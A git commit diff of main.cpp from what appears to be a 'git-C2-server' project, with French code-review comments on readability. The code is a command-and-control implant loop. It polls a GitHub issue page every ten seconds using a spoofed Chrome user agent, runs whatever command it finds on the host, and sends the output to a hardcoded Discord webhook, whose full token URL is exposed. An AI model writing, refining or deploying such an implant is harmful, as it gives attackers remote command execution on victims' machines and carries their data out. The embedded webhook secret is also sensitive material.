6caf6bbf1c3210b84c76bf8e6af06faf385283e2
Thomas Ménès <64870819+OBud75@users.noreply.github.com>
2024-03-18 10:19:32 +0000

    remarques dans main

--- main.cpp
+++ main.cpp
@@ -14,25 +14,38 @@ int main() {
     
     std::string url = "https://github.com/Momollax/git-C2-server/issues/2";
     std::string userAgent = "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/122.0.0.0 Safari/537.36";
+    auto const webhook_url = "https://discord.com/api/webhooks/1217493774268370984/zbWhTADsVXMMtXVTvzrdCtt5_cB3Zncs04zS_EWHYmJv40e3gfWhZvoq0CAhddaJ0VjM";
+    // Clarifie le code et évite de recréer la string à chaque boucle.
 
     Cmd cmd;
     HtmlParser htmlParser(cmd);
     ExecCmd execCmd("");  
     std::size_t previousMatchCount = 0; 
     const std::string& lastContent = cmd.getLastContent();
+    // lastContent n'est jamais mis à jour? Le fait de créer une
+    // référence &lastContent est un peu trompeur pour le lecteur.
+    // Effectivement &lastContent est mis à jour quand l'objet qu'il
+    // référence l'est, mais pourquoi ne pas directement utiliser
+    // cmd.getLastContent() ?
     while (true) {
         std::string response = httpRequest.get(url, userAgent);
         std::string extractedContent = htmlParser.extractContent(response);
-        if (cmd.addContentIfChanged(extractedContent)) {
-            const std::vector<std::string>& allContent = cmd.getAllContent();
-            if (htmlParser.getcmd_number() != previousMatchCount) {
-                ExecCmd execCmd(lastContent);
-                std::string commandResult = execCmd.executeCommand();
-                //std::cout << commandResult << std::endl;
-                previousMatchCount = htmlParser.getcmd_number();
-                execCmd.sendToDiscordWebhook("https://discord.com/api/webhooks/1217493774268370984/zbWhTADsVXMMtXVTvzrdCtt5_cB3Zncs04zS_EWHYmJv40e3gfWhZvoq0CAhddaJ0VjM", commandResult);
+        // On ne s'attend pas forcément à ce que la mise à jour de cmd
+        // soit dans la fonction HtmlParser::extractContent alors que c'est
+        // un élément clé pour comprendre que lastContent est mis à jour.
 
-            }
+        auto hasChanges = cmd.addContentIfChanged(extractedContent);
+        auto isNewCommand = (htmlParser.getcmd_number() != previousMatchCount);
+        // Un attribut isDone sur la classe Cmd aurait peut être été plus pratique.
+
+        if (hasChanges and isNewCommand) {
+            const std::vector<std::string>& allContent = cmd.getAllContent();
+            ExecCmd execCmd(lastContent);
+            // ExecCmd execCmd(cmd.getLastContent()) est peut être plus simple à suivre.
+            std::string commandResult = execCmd.executeCommand();
+            //std::cout << commandResult << std::endl;
+            previousMatchCount = htmlParser.getcmd_number();
+            execCmd.sendToDiscordWebhook(webhook_url, commandResult);
         }
         std::this_thread::sleep_for(std::chrono::seconds(10));
     }
